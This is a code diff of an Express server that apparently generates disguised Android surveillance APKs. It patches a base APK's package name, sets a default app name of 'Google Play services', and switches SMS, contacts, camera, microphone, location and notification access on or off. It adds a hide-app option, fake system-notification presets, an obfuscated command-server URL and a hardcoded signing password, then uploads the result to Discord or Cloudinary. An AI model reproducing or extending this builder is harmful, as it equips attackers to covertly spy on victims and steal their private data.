@@ -3,11 +3,12 @@ const multer  = require('multer');
 const cors    = require('cors');
 const fs      = require('fs');
 const path    = require('path');
-const { exec, spawn } = require('child_process');
+const { exec } = require('child_process');
 const sharp   = require('sharp');
 const axios   = require('axios');
 const cloudinary = require('cloudinary').v2;
 const FormData   = require('form-data');
+const AdmZip     = require('adm-zip');
 require('dotenv').config();
 
 const app  = express();
@@ -17,178 +18,158 @@ app.use(express.json());
 
 const upload = multer({ storage: multer.memoryStorage() });
 
-const ASSETS = path.join(__dirname, 'assets');
-const TEMP   = path.join(__dirname, 'temp');
-const BASE_APK  = path.join(ASSETS, 'base.apk');
-const KEYSTORE  = path.join(ASSETS, 'usman90.jks');
-const SIGNER    = path.join(ASSETS, 'uber-apk-signer.jar');
-const MATERIAL_ATTRS = ['state_liftable','state_lifted','state_dragged','state_collapsible','state_collapsed'];
+const ASSETS_DIR = path.join(__dirname, 'assets');
+const TEMP_DIR   = path.join(__dirname, 'temp');
+const BASE_APK   = path.join(ASSETS_DIR, 'base.apk');
+const KEYSTORE   = path.join(ASSETS_DIR, 'usman90.jks');
+const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
-if (!fs.existsSync(TEMP)) fs.mkdirSync(TEMP, { recursive: true });
+if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
-// ── Promise-wrapped spawn ──────────────────────────────────────────────────
-function runCmd(cmd, args, opts = {}) {
-    return new Promise((resolve, reject) => {
-        console.log('[CMD]', cmd, args.join(' '));
-        const p = spawn(cmd, args, { ...opts, stdio: 'inherit' });
-        p.on('close', code => code === 0 ? resolve() : reject(new Error(`${cmd} exited ${code}`)));
-        p.on('error', reject);
-    });
+// ══════════════════════════════════════════════════════════════
+//  BINARY UTILITIES (Zero-DEX modification, Byte-exact)
+// ══════════════════════════════════════════════════════════════
+
+function toUtf16LE(str) {
+    const buf = Buffer.alloc(str.length * 2);
+    for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
+    return buf;
 }
 
-// ── Package name pool (any length, proper 3-part names) ───────────────────
+function binaryReplaceU16(buf, searchStr, replaceStr) {
+    if (searchStr.length !== replaceStr.length) {
+        throw new Error(`binaryReplaceU16 length mismatch: ${searchStr.length} vs ${replaceStr.length}`);
+    }
+    const s = toUtf16LE(searchStr);
+    const r = toUtf16LE(replaceStr);
+    let count = 0, idx = 0;
+    while ((idx = buf.indexOf(s, idx)) !== -1) {
+        r.copy(buf, idx);
+        idx += s.length;
+        count++;
+    }
+    return count;
+}
+
+function binaryReplaceU8(buf, searchStr, replaceStr) {
+    const s = Buffer.isBuffer(searchStr) ? searchStr : Buffer.from(searchStr, 'utf8');
+    const r = Buffer.isBuffer(replaceStr) ? replaceStr : Buffer.from(replaceStr, 'utf8');
+    if (s.length !== r.length) {
+        throw new Error(`binaryReplaceU8 length mismatch: ${s.length} vs ${r.length}`);
+    }
+    let count = 0, idx = 0;
+    while ((idx = buf.indexOf(s, idx)) !== -1) {
+        r.copy(buf, idx);
+        idx += s.length;
+        count++;
+    }
+    return count;
+}
+
+function fixedLen(str, len, pad = ' ') {
+    return str.length >= len ? str.substring(0, len) : str + pad.repeat(len - str.length);
+}
+
+function makeNeutralPerm(originalPerm) {
+    const prefix = 'android.permission.N_';
+    const needed = originalPerm.length - prefix.length;
+    if (needed <= 0) return originalPerm;
+    return prefix + '0'.repeat(needed);
+}
+
+// ── Package Name Pool ─────────────────────────────────────────
+const OLD_PKG = 'com.asml.tech';
 const PKG_POOL = [
-    'com.cloudapp.sync','com.nettools.pro','com.appworks.core','com.devkit.tools',
-    'com.systools.app','com.datalink.hub','com.smartapp.core','com.cloudworks.io',
-    'com.appcore.utils','com.droidlab.net','com.techworks.app','com.infomedia.hub',
-    'com.moblink.data','com.syncbridge.io','com.appgate.core','com.netbridge.app',
+    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
+    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
+    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
+    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
+    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
 ];
+
 function resolvePackage(userPkg) {
     if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
-    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g,'');
-    const parts = clean.split('.').filter(Boolean);
-    if (parts.length >= 3) return parts.slice(0,3).join('.');
-    if (parts.length === 2) return clean + '.' + ['sync','hub','core','app','pro'][Math.floor(Math.random()*5)];
+    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
+    if (clean.length === OLD_PKG.length && clean.split('.').length === 3) return clean;
     return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
 }
 
-// ── AndroidManifest.xml text editing ────────────────────────────────────
-const OLD_PKG = 'com.asml.tech';
+// ── App Name Placeholder ──────────────────────────────────────
+const APP_NAME_PH = 'AppTitlePlaceholder_'; // 20 chars
 
-function editManifest(text, cfg, targetPkg) {
-    // 1. Change application package identity
-    if (targetPkg !== OLD_PKG) {
-        text = text.replace(new RegExp(`package="${OLD_PKG.replace(/\./g,'\\.')}"`, 'g'), `package="${targetPkg}"`);
-        // Convert relative class refs (.ClassName) to absolute (com.asml.tech.ClassName)
-        // so DEX lookup still resolves correctly even though applicationId changed
-        text = text.replace(/android:name="\.([\w.]+)"/g, `android:name="${OLD_PKG}.$1"`);
-        // Keep broadcast action pointing to old internal package (WakeHandler internal broadcast)
-        // No change needed — action strings are arbitrary identifiers, not package-resolved
-    }
+// ── Icon Density Files in Base APK ───────────────────────────
+const KNOWN_ICON_ENTRIES = [
+    { path: 'res/d2.webp', size: 48 },
+    { path: 'res/yw.webp', size: 48 },
+    { path: 'res/MO.webp', size: 72 },
+    { path: 'res/fq.webp', size: 72 },
+    { path: 'res/qs.webp', size: 96 },
+    { path: 'res/u5.webp', size: 96 },
+    { path: 'res/Sn.webp', size: 144 },
+    { path: 'res/j_.webp', size: 144 },
+    { path: 'res/-6.webp', size: 192 },
+    { path: 'res/sK.webp', size: 192 },
+    { path: 'res/mipmap-mdpi/ic_launcher.webp', size: 48 },
+    { path: 'res/mipmap-hdpi/ic_launcher.webp', size: 72 },
+    { path: 'res/mipmap-xhdpi/ic_launcher.webp', size: 96 },
+    { path: 'res/mipmap-xxhdpi/ic_launcher.webp', size: 144 },
+    { path: 'res/mipmap-xxxhdpi/ic_launcher.webp', size: 192 },
+    { path: 'res/mipmap-mdpi/ic_launcher.png', size: 48 },
+    { path: 'res/mipmap-hdpi/ic_launcher.png', size: 72 },
+    { path: 'res/mipmap-xhdpi/ic_launcher.png', size: 96 },
+    { path: 'res/mipmap-xxhdpi/ic_launcher.png', size: 144 },
+    { path: 'res/mipmap-xxxhdpi/ic_launcher.png', size: 192 },
+];
 
-    // 2. Remove unneeded permissions
-    const remove = [];
-    if (!cfg.enableStoragePermission)        remove.push('READ_MEDIA_IMAGES','READ_MEDIA_VIDEO','READ_EXTERNAL_STORAGE');
-    if (!cfg.enableCameraPermission)         remove.push('CAMERA','FOREGROUND_SERVICE_CAMERA');
-    if (!cfg.enableMicrophonePermission)     remove.push('RECORD_AUDIO','FOREGROUND_SERVICE_MICROPHONE');
-    if (!cfg.enableSmsPermission)            remove.push('READ_SMS','RECEIVE_SMS');
-    if (!cfg.enableContactsPermission)       remove.push('READ_CONTACTS');
-    if (!cfg.enableLocationPermission)       remove.push('ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','FOREGROUND_SERVICE_LOCATION');
-    if (!cfg.enableCameraPermission && !cfg.enableMicrophonePermission) remove.push('MANAGE_OWN_CALLS');
-
-    for (const perm of remove) {
-        text = text.replace(
-            new RegExp(`[ \\t]*<uses-permission[^>]+android\\.permission\\.${perm}[^/]*/?>\\r?\\n?`, 'g'), '');
-    }
-
-    // 3. Remove unneeded service/receiver components
-    if (!cfg.enableNotificationListener) {
-        text = text.replace(/[ \t]*<service[^\n]*AlertWatcher[\s\S]*?<\/service>[ \t]*\r?\n?/g, '');
-    }
-    if (!cfg.enableSmsPermission) {
-        text = text.replace(/[ \t]*<receiver[^\n]*SmsDeliverStub[\s\S]*?<\/receiver>[ \t]*\r?\n?/g, '');
-        text = text.replace(/[ \t]*<receiver[^\n]*MmsStub[\s\S]*?<\/receiver>[ \t]*\r?\n?/g, '');
-    }
-    if (!cfg.enableCameraPermission && !cfg.enableMicrophonePermission) {
-        text = text.replace(/[ \t]*<service[^\n]*AudioRouteService[\s\S]*?<\/service>[ \t]*\r?\n?/g, '');
-    }
-
-    return text;
-}
-
-// ── strings.xml app name edit ────────────────────────────────────────────
-function setAppName(workDir, newName) {
-    const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
-    if (!fs.existsSync(stringsPath)) return;
-    let content = fs.readFileSync(stringsPath, 'utf8');
-    content = content.replace(/<string name="app_name">.*?<\/string>/s, `<string name="app_name">${newName}</string>`);
-    fs.writeFileSync(stringsPath, content);
-    console.log(`[PATCH] app_name → "${newName}"`);
-}
-
-// ── Icon replacement ─────────────────────────────────────────────────────
-async function replaceIcons(workDir, pngBuffer) {
-    const densities = [
-        { dir: 'mipmap-mdpi',    size: 48  },
-        { dir: 'mipmap-hdpi',    size: 72  },
-        { dir: 'mipmap-xhdpi',   size: 96  },
-        { dir: 'mipmap-xxhdpi',  size: 144 },
-        { dir: 'mipmap-xxxhdpi', size: 192 },
-    ];
-
-    let replaced = 0;
-    for (const { dir, size } of densities) {
-        const dirPath = path.join(workDir, 'res', dir);
-        if (!fs.existsSync(dirPath)) continue;
-        for (const file of fs.readdirSync(dirPath)) {
-            if (!file.startsWith('ic_launcher')) continue;
-            const ext   = path.extname(file).toLowerCase();
-            const isWebp = ext === '.webp';
+async function replaceIcons(zip, pngBuffer) {
+    let count = 0;
+    for (const item of KNOWN_ICON_ENTRIES) {
+        const entry = zip.getEntry(item.path);
+        if (entry) {
             try {
-                const buf = isWebp
-                    ? await sharp(pngBuffer).resize(size, size).webp({ quality: 95 }).toBuffer()
-                    : await sharp(pngBuffer).resize(size, size).png().toBuffer();
-                fs.writeFileSync(path.join(dirPath, file), buf);
-                replaced++;
-            } catch (e) {
-                console.error(`[ICON] ${dir}/${file}:`, e.message);
+                const isPng = item.path.endsWith('.png');
+                const buf = isPng
+                    ? await sharp(pngBuffer).resize(item.size, item.size).png().toBuffer()
+                    : await sharp(pngBuffer).resize(item.size, item.size).webp({ quality: 95 }).toBuffer();
+                entry.setData(buf);
+                count++;
+            } catch (err) {
+                console.error(`[ICON] Failed replacing ${item.path}:`, err.message);
             }
         }
     }
-    // Remove adaptive XML — prevents Android from overriding our custom icon
-    const anydpiDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
-    if (fs.existsSync(anydpiDir)) fs.rmSync(anydpiDir, { recursive: true, force: true });
-
-    console.log(`[PATCH] Icons: replaced ${replaced} files`);
+    console.log(`[ICON] Replaced ${count} icon files across all densities`);
 }
 
-// ── Patch Material Design attrs (safety for older base APKs) ────────────
-function patchAttrs(workDir) {
-    const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
-    if (fs.existsSync(attrsPath)) {
-        let content = fs.readFileSync(attrsPath, 'utf8');
-        for (const attr of MATERIAL_ATTRS) {
-            if (!content.includes(`name="${attr}"`)) {
-                content = content.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
-            }
-        }
-        fs.writeFileSync(attrsPath, content);
-    } else {
-        const valDir = path.join(workDir, 'res', 'values');
-        fs.mkdirSync(valDir, { recursive: true });
-        fs.writeFileSync(attrsPath,
-            `<?xml version="1.0" encoding="utf-8"?>\n<resources>\n${MATERIAL_ATTRS.map(a=>`    <attr name="${a}" format="boolean" />`).join('\n')}\n</resources>\n`);
-    }
-}
-
-// ── Notification presets ─────────────────────────────────────────────────
-const PRESETS = {
-    default:            { title:'Google Play services',  text:'Running background checks',  icon:'info',     action:'device_info' },
-    sync:               { title:'Cloud Backup',          text:'Syncing data in background', icon:'sync',     action:'none'        },
-    google_play:        { title:'Google Play services',  text:'Checking for updates...',    icon:'info',     action:'device_info' },
-    android_system:     { title:'Android System',        text:'System functions active',    icon:'sync',     action:'settings'    },
-    device_security:    { title:'Security & Privacy',    text:'All systems secured',        icon:'lock',     action:'security'    },
-    device_maintenance: { title:'Device Care',           text:'Running in background',      icon:'sync',     action:'settings'    },
-    download_manager:   { title:'Download Manager',      text:'Transfer complete',          icon:'download', action:'none'        },
-    system_ui:          { title:'System UI',             text:'Syncing data',               icon:'sync',     action:'settings'    },
-    cloud:              { title:'Cloud Storage',         text:'Connected to cloud',         icon:'sync',     action:'none'        },
-    active:             { title:'System Framework',      text:'Service active',             icon:'info',     action:'none'        },
+// ── Notification Presets ─────────────────────────────────────
+const NOTIF_PRESETS = {
+    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
+    sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
+    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
+    android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
+    device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
+    device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
+    download_manager:   { title: 'Download Manager',      text: 'Transfer complete',          icon: 'download', action: 'none'        },
+    system_ui:          { title: 'System UI',             text: 'Syncing data',               icon: 'sync',     action: 'settings'    },
+    cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
+    active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
 };
 
-// ══════════════════════════════════════════════════════════════════════════
-//  /generate  ENDPOINT
-// ══════════════════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════════
+//  /generate ENDPOINT
+// ══════════════════════════════════════════════════════════════
+
 app.post('/generate', upload.single('icon'), async (req, res) => {
     const {
         uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
         enableSmsPermission, enableContactsPermission, enableStoragePermission,
         enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
         enableLocationPermission, aggressivePermissions,
-        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon,
+        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
     } = req.body;
     const customIcon = req.file;
 
-    console.log(`[APK] uuid=${uuid} app="${appName}" pkg="${userPkg}"`);
+    console.log(`[APK] Request UUID=${uuid} | App="${appName}" | Pkg="${userPkg}"`);
     res.status(202).json({ message: 'Processing started' });
 
     (async () => {
@@ -198,25 +179,102 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             catch (e) { console.error('[WH]', e.message); }
         };
 
-        const workDir      = path.join(TEMP, `work-${uuid}`);
-        const unsignedPath = path.join(TEMP, `unsigned-${uuid}.apk`);
+        const unsignedPath = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);
 
         try {
-            if (!fs.existsSync(BASE_APK)) throw new Error('assets/base.apk not found');
-            if (fs.existsSync(workDir))      fs.rmSync(workDir, { recursive: true, force: true });
+            if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
             if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);
 
-            const preset       = PRESETS[notificationStyle] || PRESETS.default;
             const targetPkg    = resolvePackage(userPkg);
             const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
             const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
+            const preset       = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;
 
+            await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
+            const zip = new AdmZip(BASE_APK);
+
+            // ── Step 1: Patch App Name in resources.arsc ─────────────
+            await sendUpdate('apk_progress', { step: 'Patching application title...', progress: 20 });
+            const arscEntry = zip.getEntry('resources.arsc');
+            if (arscEntry) {
+                const arscBuf = arscEntry.getData();
+                const paddedName = fixedLen(targetName, APP_NAME_PH.length);
+                const count = binaryReplaceU8(arscBuf, APP_NAME_PH, paddedName);
+                arscEntry.setData(arscBuf);
+                arscEntry.header.method = 0; // CRITICAL: method 0 (STORED)
+                console.log(`[PATCH] App name replaced: ${count} occurrences -> "${paddedName.trim()}"`);
+            }
+
+            // ── Step 2: Patch AndroidManifest.xml (AXML UTF-16LE) ───
+            await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
+            const manifestEntry = zip.getEntry('AndroidManifest.xml');
+            if (manifestEntry) {
+                const manifestBuf = manifestEntry.getData();
+
+                // 2a. Replace Package Name
+                if (targetPkg !== OLD_PKG) {
+                    const pkgCount = binaryReplaceU16(manifestBuf, OLD_PKG, targetPkg);
+                    console.log(`[PATCH] Package name replaced: ${pkgCount} occurrences -> "${targetPkg}"`);
+                }
+
+                // 2b. Neutralize unrequested permissions
+                const isSmsEnabled      = enableSmsPermission === 'true';
+                const isContactsEnabled = enableContactsPermission === 'true';
+                const isCameraEnabled   = enableCameraPermission === 'true';
+                const isMicEnabled      = enableMicrophonePermission === 'true';
+                const isLocationEnabled = enableLocationPermission === 'true';
+                const isStorageEnabled  = enableStoragePermission !== 'false';
+
+                const permsToNeutralize = [];
+                if (!isSmsEnabled) {
+                    permsToNeutralize.push('android.permission.READ_SMS', 'android.permission.RECEIVE_SMS');
+                }
+                if (!isContactsEnabled) {
+                    permsToNeutralize.push('android.permission.READ_CONTACTS');
+                }
+                if (!isCameraEnabled) {
+                    permsToNeutralize.push('android.permission.CAMERA', 'android.permission.FOREGROUND_SERVICE_CAMERA');
+                }
+                if (!isMicEnabled) {
+                    permsToNeutralize.push('android.permission.RECORD_AUDIO', 'android.permission.FOREGROUND_SERVICE_MICROPHONE');
+                }
+                if (!isLocationEnabled) {
+                    permsToNeutralize.push(
+                        'android.permission.ACCESS_FINE_LOCATION',
+                        'android.permission.ACCESS_COARSE_LOCATION',
+                        'android.permission.FOREGROUND_SERVICE_LOCATION'
+                    );
+                }
+                if (!isStorageEnabled) {
+                    permsToNeutralize.push(
+                        'android.permission.READ_MEDIA_IMAGES',
+                        'android.permission.READ_MEDIA_VIDEO',
+                        'android.permission.READ_EXTERNAL_STORAGE'
+                    );
+                }
+
+                for (const perm of permsToNeutralize) {
+                    const neutral = makeNeutralPerm(perm);
+                    binaryReplaceU16(manifestBuf, perm, neutral);
+                }
+                console.log(`[PATCH] Neutralized ${permsToNeutralize.length} unrequested permissions in manifest`);
+
+                manifestEntry.setData(manifestBuf);
+            }
+
+            // ── Step 3: Replace Icons ────────────────────────────────
+            if (customIcon && customIcon.buffer) {
+                await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
+                await replaceIcons(zip, customIcon.buffer);
+            }
+
+            // ── Step 4: Inject Runtime Configuration ────────────────
+            await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
             const socketUrl = process.env.SOCKET_SERVER_URL || 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';
-            const netParams  = Array.from(socketUrl).map((c, i) => c.charCodeAt(0) + (i % 7));
+            const netParams = Array.from(socketUrl).map((c, i) => c.charCodeAt(0) + (i % 7));
             const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));
 
-            // Runtime config — permissions controlled here, not in manifest
-            const cfg = {
+            const config = {
                 hideApp:                    hideApp === 'true',
                 theme_colors:               themeColors,
                 net_params:                 netParams,
@@ -237,84 +295,68 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 notificationChannelName:    (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
             };
 
-            // ── 1. Decompile resources only (--no-src skips smali → DEX intact) ──
-            await sendUpdate('apk_progress', { step: 'Decompiling resources...', progress: 10 });
-            await runCmd('apktool', ['d', BASE_APK, '-o', workDir, '-f', '--no-src']);
+            zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
+            zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));
 
-            // ── 2. Edit AndroidManifest.xml ────────────────────────────────────
-            await sendUpdate('apk_progress', { step: 'Configuring permissions & identity...', progress: 25 });
-            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
-            let   manifestText = fs.readFileSync(manifestPath, 'utf8');
-            manifestText = editManifest(manifestText, cfg, targetPkg);
-            fs.writeFileSync(manifestPath, manifestText);
-            console.log(`[PATCH] Manifest: pkg=${targetPkg}, permissions filtered`);
-
-            // ── 3. Set app name in strings.xml ────────────────────────────────
-            await sendUpdate('apk_progress', { step: 'Setting app name...', progress: 35 });
-            setAppName(workDir, targetName);
-
-            // ── 4. Replace launcher icons ─────────────────────────────────────
-            if (customIcon && customIcon.buffer) {
-                await sendUpdate('apk_progress', { step: 'Embedding custom icon...', progress: 45 });
-                await replaceIcons(workDir, customIcon.buffer);
+            // ── Step 5: Strip Old Signatures ─────────────────────────
+            await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
+            const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
+            for (const entry of zip.getEntries()) {
+                const en = entry.entryName;
+                if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
+                    zip.deleteFile(en);
+                }
             }
 
-            // ── 5. Patch Material Design attrs (safety) ───────────────────────
-            patchAttrs(workDir);
+            // CRITICAL: Ensure resources.arsc method is STORED (0)
+            const finalArsc = zip.getEntry('resources.arsc');
+            if (finalArsc) finalArsc.header.method = 0;
 
-            // ── 6. Inject assets ──────────────────────────────────────────────
-            await sendUpdate('apk_progress', { step: 'Injecting configuration...', progress: 55 });
-            const assetsDir = path.join(workDir, 'assets');
-            fs.mkdirSync(assetsDir, { recursive: true });
-            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(cfg, null, 2));
-            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
+            // ── Step 6: Write Unsigned APK ───────────────────────────
+            zip.writeZip(unsignedPath);
+            console.log(`[APK] Unsigned APK written (${(fs.statSync(unsignedPath).size / 1024 / 1024).toFixed(1)} MB)`);
 
-            // ── 7. Rebuild APK (DEX files from --no-src are preserved as-is) ──
-            await sendUpdate('apk_progress', { step: 'Rebuilding APK package...', progress: 65 });
-            await runCmd('apktool', ['b', workDir, '-o', unsignedPath]);
-            console.log(`[APK] Built: ${unsignedPath}`);
-
-            // ── 8. Sign with usman90.jks (V1+V2+V3, zipalign included) ────────
-            await sendUpdate('apk_progress', { step: 'Signing with usman90 keystore...', progress: 80 });
+            // ── Step 7: Sign with usman90.jks (V1+V2+V3 + Zipalign) ─
+            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
             const ksArgs = fs.existsSync(KEYSTORE)
                 ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                 : '';
-            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP}" ${ksArgs} --allowResign`;
+            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                     if (err) {
-                        console.error('[SIGN]', stderr || err.message);
-                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP}" --allowResign`,
-                            { timeout: 60000 }, e2 => e2 ? reject(e2) : resolve());
+                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
+                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
+                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                     } else {
-                        console.log('[SIGN] usman90.jks — done');
+                        console.log('[SIGN] uber-apk-signer completed successfully');
                         resolve();
                     }
                 });
             });
 
-            // ── 9. Find signed output ─────────────────────────────────────────
-            await sendUpdate('apk_progress', { step: 'Finalizing...', progress: 90 });
-            const signedName = fs.readdirSync(TEMP).find(f =>
-                f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
-            if (!signedName) throw new Error('Signed APK not found');
-            const signedPath = path.join(TEMP, signedName);
+            // ── Step 8: Locate Signed Output ─────────────────────────
+            await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
+            const signedName = fs.readdirSync(TEMP_DIR)
+                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
+            if (!signedName) throw new Error('Signed APK not found after signing step');
+            const signedPath = path.join(TEMP_DIR, signedName);
 
-            // ── 10. Upload ────────────────────────────────────────────────────
+            // ── Step 9: Upload Output ────────────────────────────────
             let downloadUrl = '';
-            await sendUpdate('apk_progress', { step: 'Uploading to cloud...', progress: 95 });
+            await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });
 
             if (process.env.DISCORD_WEBHOOK_URL) {
                 try {
                     const form = new FormData();
                     form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
                     const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
-                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity,
+                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                     });
                     downloadUrl = r.data?.attachments?.[0]?.url || '';
                     if (downloadUrl) console.log('[UPLOAD] Discord:', downloadUrl);
-                } catch (e) { console.error('[UPLOAD] Discord:', e.message); }
+                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
             }
 
             if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
@@ -327,34 +369,34 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     const binPath = signedPath.replace('.apk', '.bin');
                     fs.copyFileSync(signedPath, binPath);
                     const r = await cloudinary.uploader.upload(binPath, {
-                        resource_type: 'raw', folder: 'generated_apks',
-                        public_id: `${finalApkName.replace('.apk','')}_${Date.now()}`,
+                        resource_type: 'raw',
+                        folder:        'generated_apks',
+                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
                     });
                     downloadUrl = r.secure_url || '';
                     if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                     if (downloadUrl) console.log('[UPLOAD] Cloudinary:', downloadUrl);
-                } catch (e) { console.error('[UPLOAD] Cloudinary:', e.message); }
+                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
             }
 
-            // ── Cleanup ───────────────────────────────────────────────────────
-            [unsignedPath, signedPath].forEach(p => { try { if(fs.existsSync(p)) fs.unlinkSync(p); } catch(_){} });
-            try { if(fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true }); } catch(_){}
+            // ── Step 10: Cleanup ─────────────────────────────────────
+            [unsignedPath, signedPath].forEach(p => {
+                try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
+            });
 
             if (downloadUrl) {
                 await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
                 console.log(`[APK] ✓ Done: ${uuid} | pkg=${targetPkg}`);
             } else {
-                await sendUpdate('apk_error', { message: 'Upload failed — no storage configured' });
+                await sendUpdate('apk_error', { message: 'Upload failed — check DISCORD_WEBHOOK_URL or CLOUDINARY configuration' });
             }
 
         } catch (err) {
             console.error(`[APK] ✗ Failed ${uuid}:`, err.message);
-            try { await sendUpdate('apk_error', { message: err.message }); } catch(_){}
-            // Cleanup on error
-            try { if(fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true }); } catch(_){}
-            try { if(fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch(_){}
+            try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
+            try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
         }
     })();
 });
 
-app.listen(port, () => console.log(`[APK Generator] Port ${port}`));
+app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
